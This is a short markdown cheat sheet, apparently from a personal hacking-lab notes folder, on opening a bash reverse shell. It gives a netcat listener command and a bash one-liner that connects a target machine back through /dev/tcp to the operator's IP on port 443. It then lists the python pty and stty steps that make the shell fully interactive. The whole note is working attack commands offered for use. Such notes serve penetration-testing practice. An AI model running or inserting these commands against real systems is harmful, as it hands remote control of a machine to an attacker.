# bash

Author: Julien Bongars
Date: 2025-09-21 10:30:31
Path: /opt/development/cybersec/hacklas/notes/infiltration/reverse-shell/bash.md

---

## Source Machine

```bash
nc -lvnp 443
```

## Target Machine

```bash
bash -c "bash -i >& /dev/tcp/{YOUR_IP}/443 0>&1"
```

## Back to Source Machine

### Make fully interactive

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL-Z
stty raw -echo
fg
export TERM=xterm
```
